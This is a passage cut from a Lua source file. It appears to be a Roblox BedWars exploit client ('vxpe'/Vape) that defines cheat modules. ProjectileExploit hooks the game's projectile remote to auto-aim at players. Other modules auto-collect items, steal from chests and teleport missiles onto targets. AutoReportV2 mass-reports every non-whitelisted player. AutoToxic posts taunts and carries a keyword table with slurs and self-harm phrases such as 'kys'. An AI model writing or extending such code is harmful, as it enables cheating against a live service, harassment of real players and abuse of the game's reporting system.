										if entityLibrary.isAlive and v.PrimaryPart and (entityLibrary.character.HumanoidRootPart.Position - v.PrimaryPart.Position).magnitude <= 20 then
											bedwars.ClientHandler:Get(bedwars.PickupMetalRemote):SendToServer({
												id = v:GetAttribute("Id")
											}) 
										end
									end
								until (not AutoKit.Enabled)
							end)
						elseif bedwarsStore.equippedKit == "battery" then 
							task.spawn(function()
								repeat
									task.wait()
									local itemdrops = bedwars.BatteryEffectController.liveBatteries
									for i,v in pairs(itemdrops) do
										if entityLibrary.isAlive and (entityLibrary.character.HumanoidRootPart.Position - v.position).magnitude <= 10 then
											bedwars.ClientHandler:Get(bedwars.BatteryRemote):SendToServer({
												batteryId = i
											})
										end
									end
								until (not AutoKit.Enabled)
							end)
						elseif bedwarsStore.equippedKit == "grim_reaper" then
							task.spawn(function()
								repeat
									task.wait()
									local itemdrops = bedwars.GrimReaperController.soulsByPosition
									for i,v in pairs(itemdrops) do
										if entityLibrary.isAlive and lplr.Character:GetAttribute("Health") <= (lplr.Character:GetAttribute("MaxHealth") / 4) and v.PrimaryPart and (entityLibrary.character.HumanoidRootPart.Position - v.PrimaryPart.Position).magnitude <= 120 and (not lplr.Character:GetAttribute("GrimReaperChannel")) then
											bedwars.ClientHandler:Get(bedwars.ConsumeSoulRemote):CallServer({
												secret = v:GetAttribute("GrimReaperSoulSecret")
											})
											v:Destroy()
										end
									end
								until (not AutoKit.Enabled)
							end)
						elseif bedwarsStore.equippedKit == "farmer_cletus" then 
							task.spawn(function()
								repeat
									task.wait()
									local itemdrops = collectionService:GetTagged("BedwarsHarvestableCrop")
									for i,v in pairs(itemdrops) do
										if entityLibrary.isAlive and (entityLibrary.character.HumanoidRootPart.Position - v.Position).magnitude <= 10 then
											bedwars.ClientHandler:Get("BedwarsHarvestCrop"):CallServerAsync({
												position = bedwars.BlockController:getBlockPosition(v.Position)
											}):andThen(function(suc)
												if suc then
													bedwars.GameAnimationUtil.playAnimation(lplr.Character, 1)
													bedwars.SoundManager:playSound(bedwars.SoundList.CROP_HARVEST)
												end
											end)
										end
									end
								until (not AutoKit.Enabled)
							end)
						elseif bedwarsStore.equippedKit == "dragon_slayer" then
							task.spawn(function()
								repeat
									task.wait(0.1)
									if entityLibrary.isAlive then
										for i,v in pairs(bedwars.DragonSlayerController.dragonEmblems) do 
											if v.stackCount >= 3 then 
												bedwars.DragonSlayerController:deleteEmblem(i)
												local localPos = lplr.Character:GetPrimaryPartCFrame().Position
												local punchCFrame = CFrame.new(localPos, (i:GetPrimaryPartCFrame().Position * Vector3.new(1, 0, 1)) + Vector3.new(0, localPos.Y, 0))
												lplr.Character:SetPrimaryPartCFrame(punchCFrame)
												bedwars.DragonSlayerController:playPunchAnimation(punchCFrame - punchCFrame.Position)
												bedwars.ClientHandler:Get(bedwars.DragonRemote):SendToServer({
													target = i
												})
											end
										end
									end
								until (not AutoKit.Enabled)
							end)
						elseif bedwarsStore.equippedKit == "mage" then
							task.spawn(function()
								repeat
									task.wait(0.1)
									if entityLibrary.isAlive then
										for i, v in pairs(collectionService:GetTagged("TomeGuidingBeam")) do 
											local obj = v.Parent and v.Parent.Parent and v.Parent.Parent.Parent
											if obj and (entityLibrary.character.HumanoidRootPart.Position - obj.PrimaryPart.Position).Magnitude < 5 and obj:GetAttribute("TomeSecret") then
												local res = bedwars.ClientHandler:Get(bedwars.MageRemote):CallServer({
													secret = obj:GetAttribute("TomeSecret")
												})
												if res.success and res.element then 
													bedwars.GameAnimationUtil.playAnimation(lplr, bedwars.AnimationType.PUNCH)
													bedwars.ViewmodelController:playAnimation(bedwars.AnimationType.FP_USE_ITEM)
													bedwars.MageController:destroyTomeGuidingBeam()
													bedwars.MageController:playLearnLightBeamEffect(lplr, obj)
													local sound = bedwars.MageKitUtil.MageElementVisualizations[res.element].learnSound
													if sound and sound ~= "" then 
														bedwars.SoundManager:playSound(sound)
													end
													task.delay(bedwars.BalanceFile.LEARN_TOME_DURATION, function()
														bedwars.MageController:fadeOutTome(obj)
														if lplr.Character and res.element then
															bedwars.MageKitUtil.changeMageKitAppearance(lplr, lplr.Character, res.element)	
														end
													end)
												end
											end
										end
									end
								until (not AutoKit.Enabled)
							end)
						elseif bedwarsStore.equippedKit == "angel" then 
							table.insert(AutoKit.Connections, vapeEvents.AngelProgress.Event:Connect(function(angelTable)
								task.wait(0.5)
								if not AutoKit.Enabled then return end
								if bedwars.ClientStoreHandler:getState().Kit.angelProgress >= 1 and lplr.Character:GetAttribute("AngelType") == nil then
									bedwars.ClientHandler:Get(bedwars.TrinityRemote):SendToServer({
										angel = AutoKitTrinity.Value
									})
								end
							end))
						elseif bedwarsStore.equippedKit == "miner" then
							task.spawn(function()
								repeat
									task.wait(0.1)
									if entityLibrary.isAlive then
										for i,v in pairs(collectionService:GetTagged("petrified-player")) do 
											bedwars.ClientHandler:Get(bedwars.MinerRemote):SendToServer({
												petrifyId = v:GetAttribute("PetrifyId")
											})
										end
									end
								until (not AutoKit.Enabled)
							end)
						end
					end
				end)
			else
				bedwars.FishermanTable.startMinigame = oldfish
				oldfish = nil
			end
		end,
		HoverText = "Automatically uses a kits ability"
	})
	AutoKitTrinity = AutoKit.CreateDropdown({
		Name = "Angel",
		List = {"Void", "Light"},
		Function = function() end
	})
end)

runFunction(function()
	local AutoRelicCustom = {ObjectList = {}}

	local function findgoodmeta(relics)
		local tab = #AutoRelicCustom.ObjectList > 0 and AutoRelicCustom.ObjectList or {
			"embers_anguish",
			"knights_code",
			"quick_forge",
			"glass_cannon"
		}
		for i,v in pairs(relics) do 
			for i2,v2 in pairs(tab) do 
				if v.relic == v2 then
					return v.relic
				end
			end
		end
		return relics[1].relic
	end

	local AutoRelic = {Enabled = false}
	AutoRelic = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
		Name = "AutoRelic",
		Function = function(callback)
			if callback then 
				task.spawn(function()
					repeat
						task.wait()
						if bedwars.AppController:isAppOpen("RelicVotingInterface") then 
							bedwars.AppController:closeApp("RelicVotingInterface")
							local relictable = bedwars.ClientStoreHandler:getState().Bedwars.relic.voteState
							if relictable then 
								bedwars.RelicController:voteForRelic(findgoodmeta(relictable))
							end
							break
						end
						if matchState ~= 0 then break end
					until (not AutoRelic.Enabled)
				end)
			end
		end
	})
	AutoRelicCustom = AutoRelic.CreateTextList({
		Name = "Custom",
		TempText = "custom (relic id)"
	})
end)

runFunction(function()
	local AutoForge = {Enabled = false}
	local AutoForgeWeapon = {Value = "Sword"}
	local AutoForgeBow = {Enabled = false}
	local AutoForgeArmor = {Enabled = false}
	local AutoForgeSword = {Enabled = false}
	local AutoForgeBuyAfter = {Enabled = false}
	local AutoForgeNotification = {Enabled = true}

	local function buyForge(i)
		if not bedwarsStore.forgeUpgrades[i] or bedwarsStore.forgeUpgrades[i] < 6 then
			local cost = bedwars.ForgeUtil:getUpgradeCost(1, bedwarsStore.forgeUpgrades[i] or 0)
			if bedwarsStore.forgeMasteryPoints >= cost then 
				if AutoForgeNotification.Enabled then
					local forgeType = "none"
					for name,v in pairs(bedwars.ForgeConstants) do
						if v == i then forgeType = name:lower() end
					end
					warningNotification("AutoForge", "Purchasing "..forgeType..".", bedwars.ForgeUtil.FORGE_DURATION_SEC)
				end
				bedwars.ClientHandler:Get("ForgePurchaseUpgrade"):SendToServer(i)
				task.wait(bedwars.ForgeUtil.FORGE_DURATION_SEC + 0.2)
			end
		end
	end

	AutoForge = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
		Name = "AutoForge",
		Function = function(callback)
			if callback then 
				task.spawn(function()
					repeat
						task.wait()
						if bedwarsStore.matchState == 1 and entityLibrary.isAlive then
							if entityLibrary.character.HumanoidRootPart.Velocity.Magnitude > 0.01 then continue end
							if AutoForgeArmor.Enabled then buyForge(bedwars.ForgeConstants.ARMOR) end
							if entityLibrary.character.HumanoidRootPart.Velocity.Magnitude > 0.01 then continue end
							if AutoForgeBow.Enabled then buyForge(bedwars.ForgeConstants.RANGED) end
							if entityLibrary.character.HumanoidRootPart.Velocity.Magnitude > 0.01 then continue end
							if AutoForgeSword.Enabled then
								if AutoForgeBuyAfter.Enabled then
									if not bedwarsStore.forgeUpgrades[bedwars.ForgeConstants.ARMOR] or bedwarsStore.forgeUpgrades[bedwars.ForgeConstants.ARMOR] < 6 then continue end
								end
								local weapon = bedwars.ForgeConstants[AutoForgeWeapon.Value:upper()]
								if weapon then buyForge(weapon) end
							end
						end
					until (not AutoForge.Enabled)
				end)
			end
		end
	})
	AutoForgeWeapon = AutoForge.CreateDropdown({
		Name = "Weapon",
		Function = function() end,
		List = {"Sword", "Dagger", "Scythe", "Great_Hammer"}
	})
	AutoForgeArmor = AutoForge.CreateToggle({
		Name = "Armor",
		Function = function() end,
		Default = true
	})
	AutoForgeSword = AutoForge.CreateToggle({
		Name = "Weapon",
		Function = function() end
	})
	AutoForgeBow = AutoForge.CreateToggle({
		Name = "Bow",
		Function = function() end
	})
	AutoForgeBuyAfter = AutoForge.CreateToggle({
		Name = "Buy After",
		Function = function() end,
		HoverText = "buy a weapon after armor is maxed"
	})
	AutoForgeNotification = AutoForge.CreateToggle({
		Name = "Notification",
		Function = function() end,
		Default = true
	})
end)

runFunction(function()
	local alreadyreportedlist = {}
	local AutoReportV2 = {Enabled = false}
	local AutoReportV2Notify = {Enabled = false}
	AutoReportV2 = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
		Name = "AutoReportV2",
		Function = function(callback)
			if callback then 
				task.spawn(function()
					repeat
						task.wait()
						for i,v in pairs(playersService:GetPlayers()) do 
							if v ~= lplr and alreadyreportedlist[v] == nil and v:GetAttribute("PlayerConnected") and WhitelistFunctions:GetWhitelist(v) == 0 then 
								task.wait(1)
								alreadyreportedlist[v] = true
								bedwars.ClientHandler:Get(bedwars.ReportRemote):SendToServer(v.UserId)
								bedwarsStore.statistics.reported = bedwarsStore.statistics.reported + 1
								if AutoReportV2Notify.Enabled then 
									warningNotification("AutoReportV2", "Reported "..v.Name, 15)
								end
							end
						end
					until (not AutoReportV2.Enabled)
				end)
			end	
		end,
		HoverText = "dv mald"
	})
	AutoReportV2Notify = AutoReportV2.CreateToggle({
		Name = "Notify",
		Function = function() end
	})
end)

runFunction(function()
	local justsaid = ""
	local leavesaid = false
	local alreadyreported = {}

	local function removerepeat(str)
		local newstr = ""
		local lastlet = ""
		for i,v in pairs(str:split("")) do 
			if v ~= lastlet then
				newstr = newstr..v 
				lastlet = v
			end
		end
		return newstr
	end

	local reporttable = {
		gay = "Bullying",
		gae = "Bullying",
		gey = "Bullying",
		hack = "Scamming",
		exploit = "Scamming",
		cheat = "Scamming",
		hecker = "Scamming",
		haxker = "Scamming",
		hacer = "Scamming",
		report = "Bullying",
		fat = "Bullying",
		black = "Bullying",
		getalife = "Bullying",
		fatherless = "Bullying",
		report = "Bullying",
		fatherless = "Bullying",
		disco = "Offsite Links",
		yt = "Offsite Links",
		dizcourde = "Offsite Links",
		retard = "Swearing",
		bad = "Bullying",
		trash = "Bullying",
		nolife = "Bullying",
		nolife = "Bullying",
		loser = "Bullying",
		killyour = "Bullying",
		kys = "Bullying",
		hacktowin = "Bullying",
		bozo = "Bullying",
		kid = "Bullying",
		adopted = "Bullying",
		linlife = "Bullying",
		commitnotalive = "Bullying",
		vape = "Offsite Links",
		futureclient = "Offsite Links",
		download = "Offsite Links",
		youtube = "Offsite Links",
		die = "Bullying",
		lobby = "Bullying",
		ban = "Bullying",
		wizard = "Bullying",
		wisard = "Bullying",
		witch = "Bullying",
		magic = "Bullying",
	}
	local reporttableexact = {
		L = "Bullying",
	}
	

	local function findreport(msg)
		local checkstr = removerepeat(msg:gsub("%W+", ""):lower())
		for i,v in pairs(reporttable) do 
			if checkstr:find(i) then 
				return v, i
			end
		end
		for i,v in pairs(reporttableexact) do 
			if checkstr == i then 
				return v, i
			end
		end
		for i,v in pairs(AutoToxicPhrases5.ObjectList) do 
			if checkstr:find(v) then 
				return "Bullying", v
			end
		end
		return nil
	end

	AutoToxic = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
		Name = "AutoToxic",
		Function = function(callback)
			if callback then 
				table.insert(AutoToxic.Connections, vapeEvents.BedwarsBedBreak.Event:Connect(function(bedTable)
					if AutoToxicBedDestroyed.Enabled and bedTable.brokenBedTeam.id == lplr:GetAttribute("Team") then
						local custommsg = #AutoToxicPhrases6.ObjectList > 0 and AutoToxicPhrases6.ObjectList[math.random(1, #AutoToxicPhrases6.ObjectList)] or "How dare you break my bed >:( <name> | vxpe on top"
						if custommsg then
							custommsg = custommsg:gsub("<name>", (bedTable.player.DisplayName or bedTable.player.Name))
						end
						textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(custommsg)
					elseif AutoToxicBedBreak.Enabled and bedTable.player.UserId == lplr.UserId then
						local custommsg = #AutoToxicPhrases7.ObjectList > 0 and AutoToxicPhrases7.ObjectList[math.random(1, #AutoToxicPhrases7.ObjectList)] or "nice bed <teamname> | vxpe on top"
						if custommsg then
							local team = bedwars.QueueMeta[bedwarsStore.queueType].teams[tonumber(bedTable.brokenBedTeam.id)]
							local teamname = team and team.displayName:lower() or "white"
							custommsg = custommsg:gsub("<teamname>", teamname)
						end
						textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(custommsg)
					end
				end))
				table.insert(AutoToxic.Connections, vapeEvents.EntityDeathEvent.Event:Connect(function(deathTable)
					if deathTable.finalKill then
						local killer = playersService:GetPlayerFromCharacter(deathTable.fromEntity)
						local killed = playersService:GetPlayerFromCharacter(deathTable.entityInstance)
						if not killed or not killer then return end
						if killed == lplr then 
							if (not leavesaid) and killer ~= lplr and AutoToxicDeath.Enabled then
								leavesaid = true
								local custommsg = #AutoToxicPhrases3.ObjectList > 0 and AutoToxicPhrases3.ObjectList[math.random(1, #AutoToxicPhrases3.ObjectList)] or "My gaming chair expired midfight, thats why you won <name> | vxpe on top"
								if custommsg then
									custommsg = custommsg:gsub("<name>", (killer.DisplayName or killer.Name))
								end
								textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(custommsg)
							end
						else
							if killer == lplr and AutoToxicFinalKill.Enabled then 
								local custommsg = #AutoToxicPhrases2.ObjectList > 0 and AutoToxicPhrases2.ObjectList[math.random(1, #AutoToxicPhrases2.ObjectList)] or "L <name> | vxpe on top"
								if custommsg == lastsaid then
									custommsg = #AutoToxicPhrases2.ObjectList > 0 and AutoToxicPhrases2.ObjectList[math.random(1, #AutoToxicPhrases2.ObjectList)] or "L <name> | vxpe on top"
								else
									lastsaid = custommsg
								end
								if custommsg then
									custommsg = custommsg:gsub("<name>", (killed.DisplayName or killed.Name))
								end
								textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(custommsg)
							end
						end
					end
				end))
				table.insert(AutoToxic.Connections, vapeEvents.MatchEndEvent.Event:Connect(function(winstuff)
					local myTeam = bedwars.ClientStoreHandler:getState().Game.myTeam
					if myTeam and myTeam.id == winstuff.winningTeamId or lplr.Neutral then
						if AutoToxicGG.Enabled then
							textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("gg")
							if shared.ggfunction then
								shared.ggfunction()
							end
						end
						if AutoToxicWin.Enabled then
							textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(#AutoToxicPhrases.ObjectList > 0 and AutoToxicPhrases.ObjectList[math.random(1, #AutoToxicPhrases.ObjectList)] or "EZ L TRASH KIDS | vxpe on top")
						end
					end
				end))
				table.insert(AutoToxic.Connections, vapeEvents.LagbackEvent.Event:Connect(function(plr)
					if AutoToxicLagback.Enabled then
						local custommsg = #AutoToxicPhrases8.ObjectList > 0 and AutoToxicPhrases8.ObjectList[math.random(1, #AutoToxicPhrases8.ObjectList)]
						if custommsg then
							custommsg = custommsg:gsub("<name>", (plr.DisplayName or plr.Name))
						end
						local msg = custommsg or "Imagine lagbacking L "..(plr.DisplayName or plr.Name).." | vxpe on top"
						textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(msg)
					end
				end))
				table.insert(AutoToxic.Connections, textChatService.MessageReceived:Connect(function(tab)
					if AutoToxicRespond.Enabled then
						local plr = playersService:GetPlayerByUserId(tab.TextSource.UserId)
						local args = tab.Text:split(" ")
						if plr and plr ~= lplr and not alreadyreported[plr] then
							local reportreason, reportedmatch = findreport(tab.Text)
							if reportreason then 
								alreadyreported[plr] = true
								local custommsg = #AutoToxicPhrases4.ObjectList > 0 and AutoToxicPhrases4.ObjectList[math.random(1, #AutoToxicPhrases4.ObjectList)]
								if custommsg then
									custommsg = custommsg:gsub("<name>", (plr.DisplayName or plr.Name))
								end
								local msg = custommsg or "I don't care about the fact that I'm hacking, I care about you dying in a block game. L "..(plr.DisplayName or plr.Name).." | vxpe on top"
								textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(msg)
							end
						end
					end
				end))
			end
		end
	})
	AutoToxicGG = AutoToxic.CreateToggle({
		Name = "AutoGG",
		Function = function() end, 
		Default = true
	})
	AutoToxicWin = AutoToxic.CreateToggle({
		Name = "Win",
		Function = function() end, 
		Default = true
	})
	AutoToxicDeath = AutoToxic.CreateToggle({
		Name = "Death",
		Function = function() end, 
		Default = true
	})
	AutoToxicBedBreak = AutoToxic.CreateToggle({
		Name = "Bed Break",
		Function = function() end, 
		Default = true
	})
	AutoToxicBedDestroyed = AutoToxic.CreateToggle({
		Name = "Bed Destroyed",
		Function = function() end, 
		Default = true
	})
	AutoToxicRespond = AutoToxic.CreateToggle({
		Name = "Respond",
		Function = function() end, 
		Default = true
	})
	AutoToxicFinalKill = AutoToxic.CreateToggle({
		Name = "Final Kill",
		Function = function() end, 
		Default = true
	})
	AutoToxicTeam = AutoToxic.CreateToggle({
		Name = "Teammates",
		Function = function() end, 
	})
	AutoToxicLagback = AutoToxic.CreateToggle({
		Name = "Lagback",
		Function = function() end, 
		Default = true
	})
	AutoToxicPhrases = AutoToxic.CreateTextList({
		Name = "ToxicList",
		TempText = "phrase (win)",
	})
	AutoToxicPhrases2 = AutoToxic.CreateTextList({
		Name = "ToxicList2",
		TempText = "phrase (kill) <name>",
	})
	AutoToxicPhrases3 = AutoToxic.CreateTextList({
		Name = "ToxicList3",
		TempText = "phrase (death) <name>",
	})
	AutoToxicPhrases7 = AutoToxic.CreateTextList({
		Name = "ToxicList7",
		TempText = "phrase (bed break) <teamname>",
	})
	AutoToxicPhrases7.Object.AddBoxBKG.AddBox.TextSize = 12
	AutoToxicPhrases6 = AutoToxic.CreateTextList({
		Name = "ToxicList6",
		TempText = "phrase (bed destroyed) <name>",
	})
	AutoToxicPhrases6.Object.AddBoxBKG.AddBox.TextSize = 12
	AutoToxicPhrases4 = AutoToxic.CreateTextList({
		Name = "ToxicList4",
		TempText = "phrase (text to respond with) <name>",
	})
	AutoToxicPhrases4.Object.AddBoxBKG.AddBox.TextSize = 12
	AutoToxicPhrases5 = AutoToxic.CreateTextList({
		Name = "ToxicList5",
		TempText = "phrase (text to respond to)",
	})
	AutoToxicPhrases5.Object.AddBoxBKG.AddBox.TextSize = 12
	AutoToxicPhrases8 = AutoToxic.CreateTextList({
		Name = "ToxicList8",
		TempText = "phrase (lagback) <name>",
	})
	AutoToxicPhrases8.Object.AddBoxBKG.AddBox.TextSize = 12
end)

runFunction(function()
	local ChestStealer = {Enabled = false}
	local ChestStealerDistance = {Value = 1}
	local ChestStealerDelay = {Value = 1}
	local ChestStealerOpen = {Enabled = false}
	local ChestStealerSkywars = {Enabled = true}
	local cheststealerdelays = {}
	local cheststealerfuncs = {
		Open = function()
			if bedwars.AppController:isAppOpen("ChestApp") then
				local chest = lplr.Character:FindFirstChild("ObservedChestFolder")
				local chestitems = chest and chest.Value and chest.Value:GetChildren() or {}
				if #chestitems > 0 then
					for i3,v3 in pairs(chestitems) do
						if v3:IsA("Accessory") and (cheststealerdelays[v3] == nil or cheststealerdelays[v3] < tick()) then
							task.spawn(function()
								pcall(function()
									cheststealerdelays[v3] = tick() + 0.2
									bedwars.ClientHandler:GetNamespace("Inventory"):Get("ChestGetItem"):CallServer(chest.Value, v3)
								end)
							end)
							task.wait(ChestStealerDelay.Value / 100)
						end
					end
				end
			end
		end,
		Closed = function()
			for i, v in pairs(collectionService:GetTagged("chest")) do
				if ((entityLibrary.LocalPosition or entityLibrary.character.HumanoidRootPart.Position) - v.Position).magnitude <= ChestStealerDistance.Value then
					local chest = v:FindFirstChild("ChestFolderValue")
					chest = chest and chest.Value or nil
					local chestitems = chest and chest:GetChildren() or {}
					if #chestitems > 0 then
						bedwars.ClientHandler:GetNamespace("Inventory"):Get("SetObservedChest"):SendToServer(chest)
						for i3,v3 in pairs(chestitems) do
							if v3:IsA("Accessory") then
								task.spawn(function()
									pcall(function()
										bedwars.ClientHandler:GetNamespace("Inventory"):Get("ChestGetItem"):CallServer(v.ChestFolderValue.Value, v3)
									end)
								end)
								task.wait(ChestStealerDelay.Value / 100)
							end
						end
						bedwars.ClientHandler:GetNamespace("Inventory"):Get("SetObservedChest"):SendToServer(nil)
					end
				end
			end
		end
	}

	ChestStealer = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
		Name = "ChestStealer",
		Function = function(callback)
			if callback then
				task.spawn(function()
					repeat task.wait() until bedwarsStore.queueType ~= "bedwars_test"
					if (not ChestStealerSkywars.Enabled) or bedwarsStore.queueType:find("skywars") then
						repeat 
							task.wait(0.1)
							if entityLibrary.isAlive then
								cheststealerfuncs[ChestStealerOpen.Enabled and "Open" or "Closed"]()
							end
						until (not ChestStealer.Enabled)
					end
				end)
			end
		end,
		HoverText = "Grabs items from near chests."
	})
	ChestStealerDistance = ChestStealer.CreateSlider({
		Name = "Range",
		Min = 0,
		Max = 18,
		Function = function() end,
		Default = 18
	})
	ChestStealerDelay = ChestStealer.CreateSlider({
		Name = "Delay",
		Min = 1,
		Max = 50,
		Function = function() end,
		Default = 1,
		Double = 100
	})
	ChestStealerOpen = ChestStealer.CreateToggle({
		Name = "GUI Check",
		Function = function() end
	})
	ChestStealerSkywars = ChestStealer.CreateToggle({
		Name = "Only Skywars",
		Function = function() end,
		Default = true
	})
end)

runFunction(function()
	local FastDrop = {Enabled = false}
	FastDrop = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
		Name = "FastDrop",
		Function = function(callback)
			if callback then
				task.spawn(function()
					repeat
						task.wait()
						if entityLibrary.isAlive and (not bedwarsStore.localInventory.opened) and (inputService:IsKeyDown(Enum.KeyCode.Q) or inputService:IsKeyDown(Enum.KeyCode.Backspace)) and inputService:GetFocusedTextBox() == nil then
							task.spawn(bedwars.DropItem)
						end
					until (not FastDrop.Enabled)
				end)
			end
		end,
		HoverText = "Drops items fast when you hold Q"
	})
end)

runFunction(function()
	local MissileTP = {Enabled = false}
	local MissileTeleportDelaySlider = {Value = 30}
	MissileTP = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
		Name = "MissileTP",
		Function = function(callback)
			if callback then
				task.spawn(function()
					if getItem("guided_missile") then
						local plr = EntityNearMouse(1000)
						if plr then
							local projectile = bedwars.RuntimeLib.await(bedwars.MissileController.fireGuidedProjectile:CallServerAsync("guided_missile"))
							if projectile then
								local projectilemodel = projectile.model
								if not projectilemodel.PrimaryPart then
									projectilemodel:GetPropertyChangedSignal("PrimaryPart"):Wait()
								end;
								local bodyforce = Instance.new("BodyForce")
								bodyforce.Force = Vector3.new(0, projectilemodel.PrimaryPart.AssemblyMass * workspace.Gravity, 0)
								bodyforce.Name = "AntiGravity"
								bodyforce.Parent = projectilemodel.PrimaryPart

								repeat
									task.wait()
									if projectile.model then
										if plr then
											projectile.model:SetPrimaryPartCFrame(CFrame.new(plr.RootPart.CFrame.p, plr.RootPart.CFrame.p + gameCamera.CFrame.lookVector))
										else
											warningNotification("MissileTP", "Player died before it could TP.", 3)
											break
										end
									end
								until projectile.model.Parent == nil
							else
								warningNotification("MissileTP", "Missile on cooldown.", 3)
							end
						else
							warningNotification("MissileTP", "Player not found.", 3)
						end
					else
						warningNotification("MissileTP", "Missile not found.", 3)
					end
				end)
				MissileTP.ToggleButton(true)
			end
		end,
		HoverText = "Spawns and teleports a missile to a player\nnear your mouse."
	})
end)

runFunction(function()
	local OpenEnderchest = {Enabled = false}
	OpenEnderchest = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
		Name = "OpenEnderchest",
		Function = function(callback)
			if callback then
				local echest = replicatedStorageService.Inventories:FindFirstChild(lplr.Name.."_personal")
				if echest then
					bedwars.AppController:openApp("ChestApp", {})
					bedwars.ChestController:openChest(echest)
				else
					warningNotification("OpenEnderchest", "Enderchest not found", 5)
				end
				OpenEnderchest.ToggleButton(false)
			end
		end,
		HoverText = "Opens the enderchest"
	})
end)

runFunction(function()
	local PickupRangeRange = {Value = 1}
	local PickupRange = {Enabled = false}
	PickupRange = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
		Name = "PickupRange", 
		Function = function(callback)
			if callback then
				local pickedup = {}
				task.spawn(function()
					repeat
						local itemdrops = collectionService:GetTagged("ItemDrop")
						for i,v in pairs(itemdrops) do
							if entityLibrary.isAlive and (v:GetAttribute("ClientDropTime") and tick() - v:GetAttribute("ClientDropTime") > 2 or v:GetAttribute("ClientDropTime") == nil) then
								if ((entityLibrary.LocalPosition or entityLibrary.character.HumanoidRootPart.Position) - v.Position).magnitude <= PickupRangeRange.Value and (pickedup[v] == nil or pickedup[v] <= tick()) then
									task.spawn(function()
										pickedup[v] = tick() + 0.2
										bedwars.ClientHandler:Get(bedwars.PickupRemote):CallServerAsync({
											itemDrop = v
										}):andThen(function(suc)
											if suc then
												bedwars.SoundManager:playSound(bedwars.SoundList.PICKUP_ITEM_DROP)
											end
										end)
									end)
								end
							end
						end
						task.wait()
					until (not PickupRange.Enabled)
				end)
			end
		end
	})
	PickupRangeRange = PickupRange.CreateSlider({
		Name = "Range",
		Min = 1,
		Max = 10, 
		Function = function() end,
		Default = 10
	})
end)

runFunction(function()
	local BowExploit = {Enabled = false}
	local BowExploitTarget = {Value = "Mouse"}
	local BowExploitAutoShootFOV = {Value = 1000}
	local oldrealremote
	local noveloproj = {
		"fireball",
		"telepearl"
	}

	BowExploit = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
		Name = "ProjectileExploit",
		Function = function(callback)
			if callback then 
				oldrealremote = bedwars.ClientConstructor.Function.new
				bedwars.ClientConstructor.Function.new = function(self, ind, ...)
					local res = oldrealremote(self, ind, ...)
					local oldRemote = res.instance
					if oldRemote and oldRemote.Name == bedwars.ProjectileRemote then 
						res.instance = {InvokeServer = function(self, shooting, proj, proj2, launchpos1, launchpos2, launchvelo, tag, tab1, ...) 
							local plr
							if BowExploitTarget.Value == "Mouse" then 
								plr = EntityNearMouse(10000)
							else
								plr = EntityNearPosition(BowExploitAutoShootFOV.Value, true)
							end
							if plr then	
								if not ({WhitelistFunctions:GetWhitelist(plr.Player)})[2] then 
									return oldRemote:InvokeServer(shooting, proj, proj2, launchpos1, launchpos2, launchvelo, tag, tab1, ...)
								end
		
								tab1.drawDurationSeconds = 1
								repeat
									task.wait(0.03)
									local offsetStartPos = plr.RootPart.CFrame.p - plr.RootPart.CFrame.lookVector
									local pos = plr.RootPart.Position
									local playergrav = workspace.Gravity
									local balloons = plr.Character:GetAttribute("InflatedBalloons")
									if balloons and balloons > 0 then 
										playergrav = (workspace.Gravity * (1 - ((balloons >= 4 and 1.2 or balloons >= 3 and 1 or 0.975))))
									end
									if plr.Character.PrimaryPart:FindFirstChild("rbxassetid://8200754399") then 
										playergrav = (workspace.Gravity * 0.3)
									end
									local newLaunchVelo = bedwars.ProjectileMeta[proj2].launchVelocity
									local shootpos, shootvelo = predictGravity(pos, plr.RootPart.Velocity, (pos - offsetStartPos).Magnitude / newLaunchVelo, plr, playergrav)
									if proj2 == "telepearl" then
										shootpos = pos
										shootvelo = Vector3.zero
									end
									local newlook = CFrame.new(offsetStartPos, shootpos) * CFrame.new(Vector3.new(-bedwars.BowConstantsTable.RelX, -bedwars.BowConstantsTable.RelY, -bedwars.BowConstantsTable.RelZ))
									shootpos = newlook.p + (newlook.lookVector * (offsetStartPos - shootpos).magnitude)
									local calculated = LaunchDirection(offsetStartPos, shootpos, newLaunchVelo, workspace.Gravity, false)
									if calculated then 
										launchvelo = calculated
										launchpos1 = offsetStartPos
										launchpos2 = offsetStartPos
										tab1.drawDurationSeconds = 1
									else
										break
									end
									if oldRemote:InvokeServer(shooting, proj, proj2, launchpos1, launchpos2, launchvelo, tag, tab1, workspace:GetServerTimeNow() - 0.045) then break end
								until false
							else
								return oldRemote:InvokeServer(shooting, proj, proj2, launchpos1, launchpos2, launchvelo, tag, tab1, ...)
							end
						end}
					end
					return res
				end
			else
				bedwars.ClientConstructor.Function.new = oldrealremote
				oldrealremote = nil
			end
		end
	})
	BowExploitTarget = BowExploit.CreateDropdown({
		Name = "Mode",
		List = {"Mouse", "Range"},
		Function = function() end
	})
	BowExploitAutoShootFOV = BowExploit.CreateSlider({
		Name = "FOV",
		Function = function() end,
		Min = 1,
		Max = 1000,
		Default = 1000
	})
end)

runFunction(function()
	local RavenTP = {Enabled = false}
	RavenTP = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
		Name = "RavenTP",
		Function = function(callback)
			if callback then
				task.spawn(function()
					if getItem("raven") then
						local plr = EntityNearMouse(1000)
						if plr then
							local projectile = bedwars.ClientHandler:Get(bedwars.SpawnRavenRemote):CallServerAsync():andThen(function(projectile)
